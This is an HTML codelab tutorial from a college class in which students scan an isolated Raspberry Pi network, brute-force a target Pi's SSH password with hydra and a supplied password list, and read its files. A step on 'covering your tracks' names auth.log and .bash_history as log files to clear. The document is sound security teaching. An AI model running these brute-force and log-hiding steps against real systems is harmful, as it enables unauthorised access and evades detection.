@@ -1,0 +1,176 @@
+
+<!doctype html>
+
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, minimum-scale=1.0, initial-scale=1.0, user-scalable=yes">
+  <meta name="theme-color" content="#4F7DC9">
+  <meta charset="UTF-8">
+  <title>Fundamentals of Network Security</title>
+  <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+  <link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+  <link rel="stylesheet" href="https://storage.googleapis.com/codelab-elements/codelab-elements.css">
+  <style>
+    .success {
+      color: #1e8e3e;
+    }
+    .error {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+  <google-codelab codelab-gaid="UA-214872164-1"
+                  id="network-security"
+                  title="Fundamentals of Network Security"
+                  environment="web"
+                  feedback-link="https://github.com/Scott3142/network-security">
+    
+      <google-codelab-step label="Introduction" duration="2">
+        <p class="image-container"><img style="width: 624.00px" src="img/535325f436e201be.png"></p>
+<p><strong>Last Updated:</strong> 2019-11-19</p>
+<h2 is-upgraded><strong>Fundamentals of network security</strong></h2>
+<aside class="special"><p>This tutorial follows the Slide deck available here - <a href="https://tinyurl.com/smbc-networks" target="_blank">https://tinyurl.com/smbc-networks</a>.</p>
+</aside>
+<p><a href="https://docs.google.com/presentation/d/1JevNteScVq_D6ivtHzvOxA7CUBos8RKcWSmXiAXgHi0/edit?usp=sharing" target="_blank"><paper-button class="colored" raised><iron-icon icon="file-download"></iron-icon>Download Slide deck</paper-button></a></p>
+<aside class="warning"><p><strong>Important:</strong> It is <a href="https://www.inbrief.co.uk/offences/hacking-of-computers/" target="_blank"><strong>illegal</strong></a> to attempt to gain access to someone else&#39;s device/network without their permission.</p>
+</aside>
+<p>Throughout this class you will develop: </p>
+<p><strong><em>Your understanding of how networks are assembled and work.</em></strong></p>
+<p><strong><em>Your understanding of: </em></strong></p>
+<ul>
+<li>IP addresses</li>
+<li>Remote connections via <em>ssh</em></li>
+<li>Command line tools</li>
+<li>Brute force attacks</li>
+</ul>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Setting Up" duration="5">
+        <h2 is-upgraded><strong>Connecting the Raspberry Pi </strong></h2>
+<aside class="special"><p>This section describes the setting up of the Pi and some important commands.</p>
+</aside>
+<p><a href="https://docs.google.com/presentation/d/1JevNteScVq_D6ivtHzvOxA7CUBos8RKcWSmXiAXgHi0/edit?usp=sharing" target="_blank"><paper-button class="colored" raised><iron-icon icon="file-download"></iron-icon>Download Slide deck</paper-button></a></p>
+<p>See the image below for instructions on how to connect the Pi. When booted, the Pi should automatically connect to the local network.</p>
+<p class="image-container"><img alt="plug-in.gif" style="width: 522.35px" src="img/8fac3c02c070e88c.gif"></p>
+<aside class="warning"><p><strong>*Do not* connect any other devices to this network!</strong></p>
+</aside>
+<p>Your Pi is loaded with a version of Raspbian called <em>Raspbian Lite</em>. There is no desktop interface loaded with this distribution so you will need to use the command line during this class. You do not need to connect a mouse.</p>
+<h2 is-upgraded><strong>Some useful commands</strong></h2>
+<p>You have certain tools available which are pre-loaded on the Pi. These are:</p>
+<pre><code>nano #a simple text editor
+cat #a way of displaying text files in a terminal
+sudo #a tool for getting admin rights
+arp-scan #a tool for scanning a network for IP addresses
+ssh #a method for remotely connecting to another machine
+hydra #a tool for trying lots of login passwords from a list</code></pre>
+<p>Some example usage of these commands is demonstrated below:</p>
+<p><strong>nano - A simple text editor</strong></p>
+<pre><code>pi@raspberrypi ~ $ nano list.txt</code></pre>
+<p>This will bring up a list of passwords that you can edit. The correct password is in this list for this class. Press Ctrl+x to exit</p>
+<p><strong>cat - A way of displaying text files in a terminal</strong></p>
+<pre><code>pi@raspberrypi ~ $ cat list.txt</code></pre>
+<p>This will print the contents of the text file to the terminal. </p>
+<p><strong>arp-scan - A tool for scanning a network for IP addresses</strong></p>
+<pre><code>pi@raspberrypi ~ $ sudo arp-scan --interface=wlan0 --localnet</code></pre>
+<p>This will scan the Wi-Fi (this is specified by the wlan0 flag) network that the Pi is connected to and print all devices currently connected to that network.</p>
+<p><strong>ssh - A method for remotely connecting to another machine</strong></p>
+<pre><code>pi@raspberrypi ~ $ ssh pi@192.168.0.129</code></pre>
+<p>This will establish a remote connection to the pi located at the IP address 192.168.0.129. It will ask for a password. This is the main user password for the Pi. The default is <em>raspberry</em>.</p>
+<p><strong>hydra - A tool for trying lots of login passwords from a list</strong></p>
+<pre><code>pi@raspberrypi ~ $ hydra -l pi -P list.txt 192.168.0.129 -t 4 ssh</code></pre>
+<p>This will attempt to connect to the pi at IP address 192.168.0.129 using the passwords in the file list.txt. You can find the explanation of the rest of the command in the <a href="https://www.irongeek.com/i.php?page=backtrack-r1-man-pages/hydra" target="_blank">hydra man pages.</a></p>
+<p><strong>Note:</strong></p>
+<ul>
+<li><strong>If you press the Up arrow in a terminal window, it will bring the last command back.</strong></li>
+</ul>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Scanning the network" duration="5">
+        <h2 is-upgraded><strong>IP addresses</strong></h2>
+<aside class="special"><p>This section describes scanning the network and finding the vulnerable pi.</p>
+</aside>
+<p><a href="https://docs.google.com/presentation/d/1JevNteScVq_D6ivtHzvOxA7CUBos8RKcWSmXiAXgHi0/edit?usp=sharing" target="_blank"><paper-button class="colored" raised><iron-icon icon="file-download"></iron-icon>Download Slide deck</paper-button></a></p>
+<p>It is a good idea to first establish your own IP address. Run this command in the terminal:</p>
+<pre><code>pi@raspberrypi ~ $ ifconfig</code></pre>
+<p>Under this command, you should see some numbers 192.168.0.??? which corresponds to your IP address. Make a note of this.</p>
+<p>Run this command to scan the network for other attached devices.</p>
+<pre><code>pi@raspberrypi ~ $ sudo arp-scan --interface=wlan0 --localnet</code></pre>
+<p>You should see the other Pis in the class, the <strong>router</strong> (which will always have the IP address 192.168.0.1) and another device. This is the vulnerable device. </p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Cracking the password" duration="5">
+        <h2 is-upgraded><strong>The hydra command</strong></h2>
+<aside class="special"><p>This section describes the attempt to crack the password and gain access to the vulnerable machine.</p>
+</aside>
+<p><a href="https://docs.google.com/presentation/d/1JevNteScVq_D6ivtHzvOxA7CUBos8RKcWSmXiAXgHi0/edit?usp=sharing" target="_blank"><paper-button class="colored" raised><iron-icon icon="file-download"></iron-icon>Download Slide deck</paper-button></a></p>
+<p>Run this command in the terminal:</p>
+<pre><code>pi@raspberrypi ~ $ ssh pi@192.168.0.???</code></pre>
+<p>replacing the question marks with the IP address of a device on the network which you discovered in the previous step.</p>
+<p><strong>If you see a response that the connection was refused, try a different number.</strong></p>
+<p>Once you have attempted to enter the password, run the following command</p>
+<pre><code>pi@raspberrypi ~ $ hydra -l pi -P list.txt 192.168.0.?? -t 4 ssh</code></pre>
+<p>where the question marks are the IP address of the vulnerable device.</p>
+<p>If this connects, you now have <strong>full control </strong>of this machine. Try the following command:</p>
+<pre><code>pi@raspberrypi ~ $ ls</code></pre>
+<p>This should list the contents of the directory. If this has all been completed correctly, you should see a <em>passwords.txt </em>file in the directory. </p>
+<p>If you run the command:</p>
+<pre><code>pi@raspberrypi ~ $ cat passwords.txt</code></pre>
+<p>you should see the password to enter into the Form here: <a href="https://forms.gle/82UVt25cr7Hzx5QEA" target="_blank">https://forms.gle/82UVt25cr7Hzx5QEA</a></p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Covering your tracks" duration="5">
+        <h2 is-upgraded><strong>Log files</strong></h2>
+<aside class="warning"><p>There are certain files on the Pi that will expose an attack and the operations that took place on the device. These are called log files. </p>
+</aside>
+<p><a href="https://docs.google.com/presentation/d/1JevNteScVq_D6ivtHzvOxA7CUBos8RKcWSmXiAXgHi0/edit?usp=sharing" target="_blank"><paper-button class="colored" raised><iron-icon icon="file-download"></iron-icon>Download Slide deck</paper-button></a></p>
+<p>The two to look at are</p>
+<pre><code>/var/auth.log &amp; ~/.bash_history</code></pre>
+<p>This tutorial will not cover the rest of covering your tracks. Find out how to do this online... Good luck!</p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Conclusion" duration="2">
+        <p>Congratulations, you have reached the end of the tutorial. Good luck!</p>
+<p>If you have any questions, please contact Scott Morgan | <a href="mailto:smorgan@bridgend.ac.uk" target="_blank">smorgan@bridgend.ac.uk</a>.</p>
+<p><a href="https://docs.google.com/presentation/d/1JevNteScVq_D6ivtHzvOxA7CUBos8RKcWSmXiAXgHi0/edit?usp=sharing" target="_blank"><paper-button class="colored" raised><iron-icon icon="file-download"></iron-icon>Download Slide deck</paper-button></a></p>
+<p><strong>Next steps:</strong></p>
+<p>If you&#39;re interested in this, you should learn:</p>
+<ul>
+<li><strong>... to code. </strong><strong><em>Really learn. </em></strong>Python, JavaScript, HTML, SQL and PHP.</li>
+<li><strong>... about networks. </strong>TCP/IP, DHCP, client-server model, routers, switches, gateways, access points. </li>
+<li><strong>... about cloud networking and security for cloud-based services.</strong></li>
+<li><strong>... about the psychology and social engineering of hacking.</strong></li>
+</ul>
+<p>See more info in the <a href="https://docs.google.com/presentation/d/1JevNteScVq_D6ivtHzvOxA7CUBos8RKcWSmXiAXgHi0/edit?usp=sharing" target="_blank">Slide deck</a>.</p>
+<p><strong>Resources &amp; Further Reading:</strong></p>
+<ul>
+<li>The iDEA award - <a href="https://idea.org.uk/badge/wirehive/x/BTSKILLSDL" target="_blank">https://idea.org.uk/badge/wirehive/x/BTSKILLSDL</a> </li>
+<li>FutureLearn - <a href="https://www.futurelearn.com/courses/introduction-to-cyber-security" target="_blank">https://www.futurelearn.com/courses/introduction-to-cyber-security</a></li>
+<li>Cloud networking  - <a href="https://codelabs.developers.google.com/codelabs/cloud-networking-101/" target="_blank">https://codelabs.developers.google.com/codelabs/cloud-networking-101/</a> </li>
+<li>Kali Linux &amp; pages therein - <a href="https://www.kali.org/" target="_blank">https://www.kali.org/</a> </li>
+</ul>
+
+
+      </google-codelab-step>
+    
+  </google-codelab>
+
+  <script src="https://storage.googleapis.com/codelab-elements/native-shim.js"></script>
+  <script src="https://storage.googleapis.com/codelab-elements/custom-elements.min.js"></script>
+  <script src="https://storage.googleapis.com/codelab-elements/prettify.js"></script>
+  <script src="https://storage.googleapis.com/codelab-elements/codelab-elements.js"></script>
+  <script src="//support.google.com/inapp/api.js"></script>
+
+</body>
+</html>
